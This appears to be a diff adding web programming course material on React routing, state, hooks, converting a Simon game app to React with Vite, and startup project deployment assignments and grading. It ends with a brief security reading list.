+Now that you have reviewed the application in VS Code, take a moment to manipulate the files and see what impact your changes have. If you break the application, and can't figure out how to fix it, just delete the demo directory and start again. The more you play around with this code, the better you will understand how all the pieces of the application fit together.
+
+Make the following modifications:
+
+1. Alter the CSS to change background and text colors to something different.
+1. Replace the text in the App component with your name.
+1. Change the counter to increment by 10 instead of by one.
+
+After these changes, the application should look similar to this:
+
+![React altered](reactAppAltered.png)
+
+When you are done, submit a screen capture of the altered application to the Canvas assignment.
+
+Don't forget to update your GitHub startup repository `notes.md` with all of the things you learned and want to remember.
+
+
+
+# Router
+
+<a id="react-router"></a>React router:
+[go to top](#top)
+
+🔑 **Required reading**: [React Router DOM Tutorial](https://blog.webdevsimplified.com/2022-07/react-router/)
+
+A web framework router provides essential functionality for single-page applications. With a multiple-webpage application the headers, footers, navigation, and common components must be either duplicated in each HTML page, or injected before the server sends the page to the browser. With a single page application, the browser only loads one HTML page and then JavaScript is used to manipulate the DOM and give it the appearance of multiple pages. The router defines the routes a user can take through the application, and automatically manipulates the DOM to display the appropriate framework components.
+
+React does not have a standard router package, and there are many that you can choose from. We will use [react-router-dom](https://www.npmjs.com/package/react-router-dom) Version 6. The simplified routing functionality of React-router-dom derives from the project [react-router](https://www.npmjs.com/package/react-router) for its core functionality. Do not confuse the two, or versions of react-router-dom before version 6, when reading tutorials and documentation.
+
+![React Router](routerExample.gif)
+
+A basic implementation of the router consists of a `BrowserRouter` component that encapsulates the entire application and controls the routing action. The `Link`, or `NavLink`, component captures user navigation events and modifies what is rendered by the `Routes` component by matching up the `to` and `path` attributes.
+
+```jsx
+// Inject the router into the application root DOM element
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(
+  // BrowserRouter component that controls what is rendered
+  // NavLink component captures user navigation requests
+  // Routes component defines what component is routed to
+  <BrowserRouter>
+    <div className='app'>
+      <nav>
+        <NavLink to='/'>Home</Link>
+        <NavLink to='/about'>About</Link>
+        <NavLink to='/users'>Users</Link>
+      </nav>
+
+      <main>
+        <Routes>
+          <Route path='/' element={<Home />} exact />
+          <Route path='/about' element={<About />} />
+          <Route path='/users' element={<Users />} />
+          <Route path='*' element={<Navigate to='/' replace />} />
+        </Routes>
+      </main>
+    </div>
+  </BrowserRouter>
+);
+```
+
+## ☑ Assignment
+
+Create a fork of this [CodePen](https://codepen.io/leesjensen/pen/poKLKaX) and add another component for the path of `/scores`.
+
+When you are done submit your CodePen URL to the Canvas assignment.
+
+Don't forget to update your GitHub startup repository `notes.md` with all of the things you learned and want to remember.
+
+
+
+# Reactivity
+
+<a id="react-reactivity"></a>React reactivity:
+[go to top](#top)
+
+Making the UI react to changes in user input or data, is one of the architectural foundations of React. React enables reactivity with three major pieces of a React component: `props`, `state`, and `render`.
+
+When a component's JSX is rendered, React parses the JSX and creates a list of any references to the component's `state` or `prop` objects. React then monitors those objects and if it detects that they have changed it will call the component's `render` function so that the impact of the change is visualized.
+
+The following example contains two components: a parent `<Survey/>` component and a child `<Question/>` component. The Survey has a state named `color`. The Question has a property named `color`. The Survey passes its `color` state to the Question as a property. This means that any change to the Survey's color will also be reflected in the Question's color. This is a powerful means for a parent to control a child's functionality.
+
+The Question component also has a state named `answer`. The value of answer is displayed as part of the Question's content. The user can interact with this state through HTML radio input elements. When one of the inputs is changed the Question's `onChange` function is called and the answer state is updated to reflect the user's choice. This automatically causes the display of the answer to be updated.
+
+Be careful about your assumptions of when state is updated. Just because you called `updateState` does not mean that you can access the updated state on the next line of code. The update happens asynchronously, and therefore you never really know when it is going to happen; you only know that it will eventually happen.
+
+```jsx
+// The Survey component
+const Survey = () => {
+  const [color, updateColor] = React.useState('#737AB0');
+
+  // When the color changes update the state
+  const onChange = (e) => {
+    updateColor(e.target.value);
+  };
+  return (
+    <div>
+      <h1>Survey</h1>
+      {/* Pass the Survey color state as a property to the Question.
+          When the color changes the Question property will also be updated and rendered. */}
+      <Question color={color} />
+
+      <p>
+        <span>Pick a color: </span>
+        {/* Pass the Survey color state as a property to the input element.
+            When the color changes, the input property will also be updated and rendered. */}
+        <input type='color' onChange={(e) => onChange(e)} value={color} />
+      </p>
+    </div>
+  );
+};
+
+// The Question component
+const Question = ({ color }) => {
+  const [answer, updateAnswer] = React.useState('pending...');
+
+  function onChange({ target }) {
+    updateAnswer(target.value);
+  }
+
+  return (
+    <div>
+      <span>Do you like this</span>
+      {/* Color rerendered whenever the property changes */}
+      <span style={{ color: color }}> color</span>?
+      <label>
+        <input type='radio' name='answer' value='yes' onChange={(e) => onChange(e)} />
+        Yes
+      </label>
+      <label>
+        <input type='radio' name='answer' value='no' onChange={(e) => onChange(e)} />
+        No
+      </label>
+      {/* Answer rerendered whenever the state changes */}
+      <p>Your answer: {answer}</p>
+    </div>
+  );
+};
+
+ReactDOM.render(<Survey />, document.getElementById('root'));
+```
+
+## ☑ Assignment
+
+Create a fork of this [CodePen](https://codepen.io/leesjensen/pen/NWzYzXE) and experiment. Try changing the input from using the color and radio button, to using an edit box that reactively displays the text as you type.
+
+When you are done submit your CodePen URL to the Canvas assignment.
+
+Don't forget to update your GitHub startup repository `notes.md` with all of the things you learned and want to remember.
+
+### 🧧 Possible solution
+
+If you get stuck here is a possible solution.
+
+```jsx
+// The Survey component
+const Survey = () => {
+  const [text, updateText] = React.useState('');
+
+  const onChange = (e) => {
+    updateText(e.target.value);
+  };
+  return (
+    <div>
+      <h1>Survey</h1>
+      <Question text={text} />
+
+      <p>
+        <span>Type some text: </span>
+        <input type='text' onChange={(e) => onChange(e)} placeholder='type here' />
+      </p>
+    </div>
+  );
+};
+
+// The Question component
+const Question = ({ text }) => {
+  return (
+    <div>
+      <p>You typed: {text}</p>
+    </div>
+  );
+};
+```
+
+
+
+# Tic-Tac-Toe tutorial
+
+<a id="react-tic-tac-toe"></a>React Tic-Tac-Toe tutorial:
+[go to top](#top)
+
+The tic-tac-toe tutorial provided on the React website is a good way to get familiar with the basics of React. The tutorial starts out simple and then introduces different concepts until you have built a fully functional application.
+
+![tictactoe](tictactoe.jpg)
+
+## ☑ Assignment
+
+Complete the [tic-tac-toe tutorial](https://react.dev/learn/tutorial-tic-tac-toe). Note that the tutorial uses `codesandbox.io` instead of CodePen. You will need to create an account there in order to save your fork of the project. Don't worry about following the tutorial exactly. Feel free to take things in whatever direction interests you. The point is to experiment and have fun.
+
+When you are done submit your CodeSandbox URL to the Canvas assignment.
+
+
+
+# React hooks
+
+<a id="react-hooks"></a>React hooks:
+[go to top](#top)
+
+📖 **Recommended reading**: [Reactjs.org - Hooks Overview](https://reactjs.org/docs/hooks-overview.html)
+
+React hooks allow React function style components to be able to do everything that a class style component can do and more. Additionally, as new features are added to React they are including them as hooks. This makes function style components the preferred way of doing things in React. You have already seen one use of hooks to declare and update state in a function component with the `useState` hook.
+
+```jsx
+function Clicker({initialCount}) {
+  const [count, updateCount] = React.useState(initialCount);
+  return <div onClick={() => updateCount(count + 1)}>Click count: {count}</div>;
+}
+
+ReactDOM.render(<Clicker initialCount={3} />, document.getElementById('root'));
+```
+
+## useEffect hook
+
+The `useEffect` hook allows you to represent lifecycle events. For example, if you want to run a function every time the component completes rendering, you could do the following.
+
+```jsx
+function UseEffectHookDemo() {
+  React.useEffect(() => {
+    console.log('rendered');
+  });
+
+  return <div>useEffectExample</div>;
+}
+
+ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));
+```
+
+You can also take action when the component cleans up by returning a cleanup function from the function registered with `useEffect`. In the following example, every time the component is clicked the state changes and so the component is rerendered. This causes both the cleanup function to be called in addition to the hook function. If the function was not rerendered then only the cleanup function would be called.
+
+```jsx
+function UseEffectHookDemo() {
+  const [count, updateCount] = React.useState(0);
+  React.useEffect(() => {
+    console.log('rendered');
+
+    return function cleanup() {
+      console.log('cleanup');
+    };
+  });
+
+  return <div onClick={() => updateCount(count + 1)}>useEffectExample {count}</div>;
+}
+
+ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));
+```
+
+This is useful when you want to create side effects for things such as tracking when a component is displayed or hidden, or creating and disposing of resources.
+
+## Hook dependencies
+
+You can control what triggers a `useEffect` hook by specifying its dependencies. In the following example we have two state variables, but we only want the `useEffect` hook to be called when the component is initially called and when the first variable is clicked. To accomplish this you pass an array of dependencies as a second parameter to the `useEffect` call.
+
+```jsx
+function UseEffectHookDemo() {
+  const [count1, updateCount1] = React.useState(0);
+  const [count2, updateCount2] = React.useState(0);
+
+  React.useEffect(() => {
+    console.log(`count1 effect triggered ${count1}`);
+  }, [count1]);
+
+  return (
+    <ol>
+      <li onClick={() => updateCount1(count1 + 1)}>Item 1 - {count1}</li>
+      <li onClick={() => updateCount2(count2 + 1)}>Item 2 - {count2}</li>
+    </ol>
+  );
+}
+
+ReactDOM.render(<UseEffectHookDemo />, document.getElementById('root'));
+```
+
+If you specify and empty array `[]` as the hook dependency then it is only called when the component is first rendered.
+
+Note that hooks can only be used in function style components and must be called at the top scope of the function. That means a hook cannot be called inside of a loop or conditional. This restriction ensures that hooks are always called in the same order when a component is rendered.
+
+
+
+# Simon React
+
+<a id="react-simon"></a>Simon React:
+[go to top](#top)
+
+🎥 **Instruction video**: [Simon React](https://youtu.be/wO20-h3qNXE)
+
+![Simon](../simon.png)
+
+This deliverable demonstrates using [React](https://reactjs.org/) as a web framework and Vite as your frontend tooling. This helps with tasks such as building modular components, providing reactive UI elements, supporting sessions, lazy loading, and reducing (minifying) the size of your application.
+
+As part of the move to React, we convert Simon from a **multi-page application** to a **single-page application**. In a single-page application, the browser only loads a single HTML file (index.html), and then we use JavaScript to interactively change the rendered content and components. This is a significant architectural shift to the application and will require you to reorganize your code to fit the single-page, component driven, model.
+
+# Steps to convert Simon to React
+
+The following section discusses the general steps taken to convert the Simon application from a simple HTML/CSS/JavaScript application to a React application. You will need to take similar steps for your startup project, and so it is important to understand what is happening at each step of the conversion process. You don't necessarily have to go through this process with the Simon demonstration application, but it is a safe place to try since you have both the starting version (simon-websocket) and the ending version (simon-react) to reference.
+
+We begin by introducing `vite`, our frontend tooling. The HTML, CSS, and JavaScript is then reworked into React components. The React components are then reworked to take advantage of functionality that React provides. This includes function style components, modularization, reactive interactions, and a React representation of Bootstrap.
+
+Here is a complete list of all the steps involved to convert Simon to a React application. When you port your startup to React you will want to commit your changes as you complete each step in the process.
+
+1. Clone the `simon-websocket` repository
+1. Reorganize the code
+1. Install and configure Vite
+1. Convert to React Bootstrap
+1. Enable React
+1. Create app component
+1. Create view components
+1. Create the router
+1. Convert scores component
+1. Convert other components
+
+To give you a picture of where we will end up after porting to React, the final Simon project structure looks like the following.
+
+```sh
+├─ vite.config.js              # Config for Vite dev debugging
+├─ deployReact.sh              # React specific deployment
+├─ index.html                  # Single HTML file for the App
+├─ index.jsx                   # Loads the top level component
+├─ package.json                # Defines dependent modules
+├─ public                      # Static assets used in the app
+│   ├─ button-bottom-left.mp3
+│   ├─ button-bottom-right.mp3
+│   ├─ button-top-left.mp3
+│   ├─ button-top-right.mp3
+│   ├─ error.mp3
+│   └─ favicon.ico
+├─ service                     # Backend service code
+│   ├─ database.js
+│   ├─ dbConfig.json
+│   ├─ index.js
+│   ├─ package-lock.json
+│   ├─ package.json
+│   └─ peerProxy.js
+└─ src                         # Frontend React code
+    ├─ app.jsx                 # Top level component
+    ├─ app.css
+    ├─ about                   # About component
+    │   ├─ about.css
+    │   └─ about.jsx
+    ├─ login                   # Login component
+    │   ├─ login.jsx           # Renders auth sub-components
+    │   ├─ authState.js        # Enum for auth state
+    │   ├─ unauthenticated.jsx # Renders if unauthenticated
+    │   ├─ authenticated.jsx   # Renders if authenticated
+    │   ├─ authenticated.css
+    │   └─ messageDialog.jsx
+    ├─ play                    # Game play component
+    │   ├─ delay.js
+    │   ├─ gameNotifier.js
+    │   ├─ play.jsx
+    │   ├─ players.css
+    │   ├─ players.jsx
+    │   ├─ simonButton.jsx
+    │   ├─ simonGame.css
+    │   └─ simonGame.jsx
+    └─ scores                 # Scores component
+        ├─ scores.css
+        └─ scores.jsx
+```
+
+## Reorganize the code
+
+Because we are hosting both the Simon React application and the Simon service web service in the same project, we need to put them each in separate directories. We want the service code in a `service` directory and the React code in the `src` directory. To accomplish this, first delete the `node_modules` directory from the `simon` directory. Then move the service code (`package.json`, `package-lock.json`, `index.js`, `database.js`, `peerProxy.js`, and `dbConfig.json`) into a subdirectory named `service`. Then run `npm install` in the `service` directory in order to get the NPM packages for the service.
+
+Once you move the service to the `service` directory, you can test that the service is still working by running `node index.js` from a console window in the `service` directory, or by pressing `F5` in VS Code. Try it out and make sure you can hit the service endpoints using `curl`.
+
+```sh
+➜  curl 'localhost:3000/api/user/joe'
+
+{"msg":"Unknown"}
+```
+
+Next, we want to move the existing UI code to a location where Vite expects to find it. To do this we move all of the files out of `public` into the project root directory. This will allow us to run our existing code under Vite to make sure everything is working. Once we start porting over to React, we will convert each of these files to React components located in a directory called `src`. From the root project directory run:
+
+```sh
+mv public/* .
+rm -r public
+```
+
+## Install and configure Vite
+
+Install Vite as a development dependency by running:
+
+```sh
+ npm install vite@latest -D
+```
+
+Then insert/replace the `scripts` found in `package.json` to include the commands for running Vite.
+
+```json
+  "scripts": {
+    "dev": "vite",
+    "build": "vite build",
+    "preview": "vite preview"
+  }
+```
+
+### Configuring Vite for debugging
+
+When running in production, the Simon web service running under Node.js on port 3000 serves up the Simon React application code when the browser requests `index.html`. This is the same as we did with previous Simon deliverables. The service pulls those files from the application's static HTML, CSS, and JavaScript files located in the `public` directory that we set up when we build the production distribution package.
+
+![Setting up React ports](simonProduction.jpg)
+
+However, when the application is running in debug mode in your development environment, we actually need two HTTP servers running: one for the Node.js backend HTTP server, and one for the Vite frontend HTTP server. This allows us to develop and debug both our backend and our frontend while viewing the results in the browser.
+
+By default, Vite uses port 5173 when running in development mode. Vite starts up the debugging HTTP server when we run `npm run dev`. That means the browser is going to send network requests to port 5173. We can configure the Vite HTTP server to proxy service HTTP and WebSocket requests to the Node.js HTTP server by providing a configuration file named `vite.config.js` with the following contents.
+
+```js
+import { defineConfig } from 'vite';
+
+export default defineConfig({
+  server: {
+    proxy: {
+      '/api': 'http://localhost:3000',
+      '/ws': {
+        target: 'ws://localhost:3000',
+        ws: true,
+      },
+    },
+  },
+});
+```
+
+When running in this configuration, the network requests now flow as shown below. Without this you will not be able to debug your React application in your development environment.
+
+![Setting up React ports](simonDevelopmentDebugging.jpg)
+
+With our server running, and our files in the place where Vite expects them, we can test that everything still works. You can start Vite in dev mode with the command `npm run dev`, followed by pressing the `o` key to open the application in the browser. When you reach this point with your startup, make sure that you commit your changes.
+
+## Convert to React Bootstrap
+
+There is an NPM package called [React Bootstrap](https://react-bootstrap.github.io/) that wraps the Bootstrap CSS framework in React components. This allows you to treat the Bootstrap widgets, such as Button and Modal, as a React component instead of just imported CSS and JavaScript.
+
+To use the React version of Bootstrap, import the NPM package.
+
+```sh
+npm install bootstrap react-bootstrap
+```
+
+Now, in the components where you want to refer to the Bootstrap styles, you can import the Bootstrap style sheet from the
+imported NPM package just like you would other CSS files.
+
+```jsx
+import 'bootstrap/dist/css/bootstrap.min.css';
+```
+
+To use a React Bootstrap component, you would import and reference the specific component you want to use. Here is an example of using the `Button` component.
+
+```jsx
+import Button from 'react-bootstrap/Button';
+
+export function NavButton({ text, url }) {
+  const navigate = useNavigate();
+  return (
+    <Button variant='primary' onClick={() => navigate({ url })}>
+      {text}
+    </Button>
+  );
+}
+```
+
+For Simon we converted the modal dialog and button implementations to use the React Bootstrap components.
+
+## Enabling React
+
+We now have everything set up to start using React for the application. To make this happen, we need to install the React components for the basic functionality, DOM manipulation, and request routing to display individual components. React is installed by running the following console command:
+
+```sh
+npm install react react-dom react-router-dom
+```
+
+### `index.html` and `index.jsx`
+
+With React we have a single HTML file that dynamically loads all of the other application components into its DOM using JavaScript. We replace the existing `index.html` file with the following React version.
+
+**`index.html`**
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+
+    <title>Simon React</title>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+    <script type="module" src="/index.jsx"></script>
+  </body>
+</html>
+```
+
+Notice that the div with an ID of `root` is where all the content will be injected. The script reference for `index.jsx` causes the injection of the top level component named `App`. To hook the `index.html` to our top level `App` component, we create the following `index.jsx` file.
+
+**`index.jsx`**
+
+```jsx
+import React from 'react';
+import ReactDOM from 'react-dom/client';
+import App from './src/app';
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(<App />);
+```
+
+## Create App component
+
+To begin the transformation to using React components in our application, we create a top-level component, stored in `src/app.jsx`, and add some placeholder content that will get replaced later. In order for the styling to show up, we include Bootstrap, move the `main.css` content into a file named `src/app.css`, and import the CSS file into the `app.jsx` file. Because we don't have a `body` element in our `App` component, we modify the `app.css` so that the selector for the `body` element is changed to a class selector `.body`.
+
+**app.jsx**
+
+```jsx
+import React from 'react';
+import 'bootstrap/dist/css/bootstrap.min.css';
+import './app.css';
+
+export default function App() {
+  return <div className='body bg-dark text-light'>App will display here</div>;
+}
+```
+
+You should be able to view the results of these changes by running `npm run dev` from the console and pressing the `o` key to open it in the browser. The result won't be very exciting, but this successfully demonstrates the first visible step towards moving to React. When you reach this point with your startup, make sure that you commit your changes.
+
+![First React component](firstReactComponent.png)
+
+To make `app.jsx` represent the actual Simon content, we enhance the `app.jsx` file to contain the header and footer HTML found in each of our previous HTML files, into the return value for the `App()` component function. Next, we rename the `class` attribute to be `className` so that it doesn't conflict with the JavaScript `class` keyword. The `className` keyword will get transpiled to valid HTML by our toolchain. When completed, the `App` component should look like this:
+
+**app.jsx**
+
+```jsx
+export default function App() {
+  return (
+    <div className='body bg-dark text-light'>
+      <header className='container-fluid'>
+        <nav className='navbar fixed-top navbar-dark'>
+          <div className='navbar-brand'>
+            Simon<sup>&reg;</sup>
+          </div>
+          <menu className='navbar-nav'>
+            <li className='nav-item'>
+              <a className='nav-link' href='index.html'>
+                Home
+              </a>
+            </li>
+            <li className='nav-item'>
+              <a className='nav-link' href='play.html'>
+                Play
+              </a>
+            </li>
+            <li className='nav-item'>
+              <a className='nav-link' href='scores.html'>
+                Scores
+              </a>
+            </li>
+            <li className='nav-item'>
+              <a className='nav-link' href='about.html'>
+                About
+              </a>
+            </li>
+          </menu>
+        </nav>
+      </header>
+
+      <main>App components go here</main>
+
+      <footer className='bg-dark text-white-50'>
+        <div className='container-fluid'>
+          <span className='text-reset'>Author Name(s)</span>
+          <a className='text-reset' href='https://github.com/webprogramming260/simon-react'>
+            Source
+          </a>
+        </div>
+      </footer>
+    </div>
+  );
+}
+```
+
+This will display the header, navigation elements, placeholder content, and the footer. When you reach this point with your startup, make sure that you commit your changes.
+
+![App React component](appReactComponent.png)
+
+## Create view components
+
+We now create React component files `login.jsx`, `play.jsx`, `scores.jsx`, and `about.jsx` to represent each of the application views. To begin with, these are just stubs that we will populate as we move functionality from the old `js` files into the `jsx` components. We place each of the stubbed components in a separate directory (e.g. `src/login/login.jsx`) so that we can keep all of the component files together.
+
+Here is the `login.jsx` stub before any code is converted over. The other components are similar.
+
+```jsx
+import React from 'react';
+
+export function Login() {
+  return (
+    <main className='container-fluid bg-secondary text-center'>
+      <div>login displayed here</div>
+    </main>
+  );
+}
+```
+
+## Create the router
+
+With `app.jsx` containing the header and footer, and all the application view component stubs created, we can now create the router that will display each component as the navigation UI requests it. The router controls the whole application by determining what component to display based upon what navigation the user chooses. To implement the router, we import the router component into the `App` component, and wrap all of the `App` component's elements with the `BrowserRouter` component. We also import all of our view components.
+
+```jsx
+import { BrowserRouter, NavLink, Route, Routes } from 'react-router-dom';
+import { Login } from './login/login';
+import { Play } from './play/play';
+import { Scores } from './scores/scores';
+import { About } from './about/about';
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(
+  <BrowserRouter>
+    <div className='body bg-dark text-light'><!-- sub-elements here --></div>
+  </BrowserRouter>
+);
+```
+
+### Navigating routes
+
+We then we replace the `a` elements with the router's `NavLink` component. The anchor element's `href` attribute is replaced with the router's `to` attribute. The `NavLink` component prevents the browser's default navigation functionality and instead handles it by replacing the currently displayed component.
+
+```jsx
+<a className="nav-link" href="play.html">Play</a>
+
+// to
+
+<NavLink className='nav-link' to='play'>Play</NavLink>
+```
+
+The `nav` element's code now looks like the following.
+
+```jsx
+<nav className='navbar fixed-top navbar-dark'>
+  <div className='navbar-brand'>
+    Simon<sup>&reg;</sup>
+  </div>
+  <menu className='navbar-nav'>
+    <li className='nav-item'>
+      <NavLink className='nav-link' to=''>
+        Login
+      </NavLink>
+    </li>
+    <li className='nav-item'>
+      <NavLink className='nav-link' to='play'>
+        Play
+      </NavLink>
+    </li>
+    <li className='nav-item'>
+      <NavLink className='nav-link' to='scores'>
+        Scores
+      </NavLink>
+    </li>
+    <li className='nav-item'>
+      <NavLink className='nav-link' to='about'>
+        About
+      </NavLink>
+    </li>
+  </menu>
+</nav>
+```
+### Injecting the routed component
+
+The router definitions are then inserted so that the router knows what component to display for a given path. The router changes the rendered component; it appears in the place of the `Routes` element. The `Routes` element replaces the `main` element in the component HTML.
+
+```jsx
+ <main>App components go here</main>
+
+ // to
+
+<Routes>
+  <Route path='/' element={<Login />} exact />
+  <Route path='/play' element={<Play />} />
+  <Route path='/scores' element={<Scores />} />
+  <Route path='/about' element={<About />} />
+  <Route path='*' element={<NotFound />} />
+</Routes>
+```
+
+Notice that the `*` (default matcher) was added to handle the case where an unknown path is requested. We handle this by creating a component for a path that is not found. We place this component at the bottom of our `src/app.jsx` file.
+
+```js
+function NotFound() {
+  return <main className='container-fluid bg-secondary text-center'>404: Return to sender. Address unknown.</main>;
+}
+```
+
+At this point the application should support navigating to the different components. When you reach this point with your startup, make sure that you commit your changes.
+
+![Routing](routingComponents.gif)
+
+## Converting to React components
+
+The code for each of the HTML pages needs to now be converted to the different React components. Each of the components is a bit different, and so you want to review them to determine what they look like as a React component.
+
+The basic steps for converting the component include the following.
+
+- Copy the `main` element HTML over and put it in the return value of the component. Don't copy the header and footer HTML since they are now represented in `app.jsx`.
+- Rename the `class` to `className` so that it doesn't conflict with the JavaScript keyword `class`.
+- Copy the JavaScript over and turn the functions into inner functions of the React component.
+- Move the CSS over to the component directory and use an `import` statement to bring it into the component's `jsx` file.
+- Create React state variables for each of the stateful objects in the component.
+- Replace DOM query selectors with React state variables.
+- Move state up to parent components as necessary. For example, authentication state, or user name state.
+- Create child components as necessary. For example, a `SimonGame` and `SimonButton` component.
+
+In order for you to have a feel for how this is done we will demonstrate how this is done with the `Scores` component.
+
+## Convert `Scores` component
+
+The first step to implementing the `Scores` component is to create a state variable that will represent the scores that we read from the server. We will update the scores as a side effect when our `fetch` request to get the scores asynchronously completes. This is done with the following code:
+
+```jsx
+const [scores, setScores] = React.useState([]);
+
+React.useEffect(() => {
+  fetch('/api/scores')
+    .then((response) => response.json())
+    .then((scores) => {
+      setScores(scores);
+      localStorage.setItem('scores', JSON.stringify(scores));
+    })
+    .catch(() => {
+      const scoresText = localStorage.getItem('scores');
+      if (scoresText) {
+        setScores(JSON.parse(scoresText));
+      }
+    });
+}, []);
+```
+
+When we get the scores back from the backend server, we want to convert them to JSX. This is done by iterating through the scores and pushing them into a variable named `scoreRows` that represents an array of JSX elements for each high score.
+
+```jsx
+const scoreRows = [];
+if (scores.length) {
+  for (const [i, score] of scores.entries()) {
+    scoreRows.push(
+      <tr key={i}>
+        <td>{i}</td>
+        <td>{score.name.split('@')[0]}</td>
+        <td>{score.score}</td>
+        <td>{score.date}</td>
+      </tr>
+    );
+  }
+} else {
+  scoreRows.push(
+    <tr key='0'>
+      <td colSpan='4'>Be the first to score</td>
+    </tr>
+  );
+}
+```
+
+Now we can bring over the `main` element from the existing `scores.html` file to the `src/scores/scores.jsx` file and place it as the return value from the component function. Next, we insert a reference to the `scoreRows` variable that will display the score JSX. That should look like the following:
+
+```jsx
+return (
+  <main className='container-fluid bg-secondary text-center'>
+    <table className='table table-warning table-striped-columns'>
+      <thead className='table-dark'>
+        <tr>
+          <th>#</th>
+          <th>Name</th>
+          <th>Score</th>
+          <th>Date</th>
+        </tr>
+      </thead>
+      <tbody id='scores'>{scoreRows}</tbody>
+    </table>
+  </main>
+);
+```
+
+That completes the conversion of the HTML and JavaScript files that represent the scores functionality. You can safely delete the original `scores.html` and `scores.js` files.
+
+Now we just need to move `scores.css` to `src/scores/scores.css` and import the CSS into the `src/scores/scores.jsx`.
+
+```jsx
+import './scores.css';
+```
+
+With that all done, the scores should render nicely. You can follow a similar process to convert the other three application views to components.
+
+![Scores component](scoresComponent.png)
+
+## Test as you go
+
+That was a lot of changes and it is easy to make a mistake during the process. When you do this with your startup application, you will find it easier if you make a small change, and test that it still works. If it does, commit that change to Git. That way you can recover when things get broken before it gets out of hand.
+
+## Study this code
+
+Get familiar with what the example code teaches.
+
+- Clone the repository to your development environment.
+
+  ```sh
+  git clone https://github.com/webprogramming260/simon-react.git
+  ```
+
+- Set up your Atlas credentials in a file named `dbConfig.json` that is in the same directory as `database.js`.
+- Add `dbConfig.json` to your `.gitignore` file so that it doesn't put your credentials into GitHub accidentally.
+- Review the code and get comfortable with everything it represents.
+- View the code in your browser by hosting it from a VS Code debug session. ⚠ Do not use the `live server` extension since your frontend code will now be served up by the Node.js server you created in `index.js`. Set breakpoints in your backend code inside of Visual Studio.
+- Make modifications to the code as desired. Experiment and see what happens.
+
+## Deploy to production
+
+- Deploy to your production environment using a copy of the `deployReact.sh` script found in the [example class application](https://github.com/webprogramming260/simon-react/blob/main/deployReact.sh). Take some time to understand how it works.
+
+  ⚠ **NOTE** - The `deployReact.sh` deployment script is different from the previous scripts and depends upon the `vite` package to be installed so that it can execute the toolchain that bundles the React application into static files that the browser can render. The bundled files are then deployed to your production environment and served up using the Express static files middleware.
+
+  ```sh
+  ./deployReact.sh -k <yourpemkey> -h <yourdomain> -s simon
+  ```
+
+  For example,
+
+  ```sh
+  ./deployReact.sh -k ~/keys/production.pem -h yourdomain.click -s simon
+  ```
+
+- Update your `startup` repository `notes.md` with what you learned.
+- Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
+
+
+
+
+# Startup React
+
+<a id="react-startup"></a>Startup React:
+[go to top](#top)
+
+Now that you have experience with using a web framework, it is time to convert your application to use React. This will require significant modifications to your frontend code. Make sure you reserve enough time to successfully complete this work.
+
+You must use the same startup GitHub repository that you created in the earlier instruction. Update the `notes.md` file with things that you learn as you work on your startup. As you make changes to your application, commit those changes and push them to GitHub. You will need at least four commits to get full credit, but in reality you should have many more than that.
+
+Remember to use the the browser's debugger window to debug your CSS and JavaScript. You can also debug your service JavaScript running on Node.js using the built in VS Code Node.js debugger.
+
+Once you have developed your application to where you want it, you need to release it to your production environment. **Replace** your previous startup deployment script with a copy of the `deployReact.sh` script from the [Simon React repository](https://github.com/webprogramming260/simon-react/blob/main/deployReact.sh) and use `startup` for the service parameter (`-s`).
+
+```sh
+./deployReact.sh -k <yourpemkey> -h <yourdomain> -s startup
+```
+
+For example,
+
+```sh
+./deployReact.sh -k ~/keys/production.pem -h yourdomain.click -s startup
+```
+
+Doing this will make this deliverable of your startup available from `https://startup.yourdomainname`.
+
+## ☑ Assignment
+
+1. Review and deploy Simon React
+   1. Clone the Simon React repository to your development environment.
+   1. Run `npm install` in both the root of the project and the `services` directory.
+   1. Open the project in VS Code and examine the application's use of React.
+   1. Create and configure the `service/dbConfig.json` file with your MongoDB credentials.
+   1. Execute your backend code in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing `service/index.js`). Set breakpoints in VS Code and step through the backend JavaScript related to login interactions.
+   1. Execute your frontend code in your development environment by running `npm start` from the console in the root of the project. This will automatically open your browser to https://localhost:3001. Use the browser's dev tools to step through the frontend JavaScript using the Source tab.
+   1. Deploy to your production environment using the deployment script so that it is available with your domain's `simon` subdomain.
+1. Convert your startup frontend to use React. This includes:
+   1. Creating a template starting application using `create-react-app` and cleaning up what it created.
+   1. Creating a react router that displays stubbed components for the main pieces of your application.
+   1. Converting your previous HTML files into the stubbed components.
+1. Make sure your name is displayed in the application and that there is a link to your GitHub repository.
+1. Periodically commit and push your code to GitHub.
+1. Periodically update your startup repository's `notes.md` file to reflect what you have learned and want to remember.
+1. Push your final version of your project to GitHub.
+1. Deploy your startup application to your production environment (your server).
+1. Make sure your application is available from your production environment.
+1. Upload the URL to your startup application to the Canvas assignment.
+
+## Grading Rubric
+
+- (Required) Simon React deployed to your production environment
+- (Required) A link to your GitHub startup repository prominently displayed on your application's home page
+- (Required) Notes in your startup Git repository `README.md` file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the [voter app](https://github.com/webprogramming260/startup-example) as an example.
+- Application converted to use React
+  - 10% Bundled using Vite
+  - 30% Multiple functional react components
+  - 30% React router
+  - 20% React hooks
+- 10% - Multiple Git commits with meaningful comments.
+
+## Go celebrate
+
+With the completion of your application you have become a Startup Founder. Way to go! Time to grab some friends, recruit them to market your soon-to-be-viral application, and celebrate by going out to lunch. I'm thinking tacos. 🌮
+
+
+
+
+# Assorted Topics (Optional)
+
+
+
+# Security overview
+
+<a id="security"></a>Security overview:
+[go to top](#top)
+
+📖 **Deeper dive reading**:
+
+- [Database of publicized software vulnerabilities](https://cve.mitre.org/)
+- [SQL Injection](https://portswigger.net/web-security/sql-injection)
+
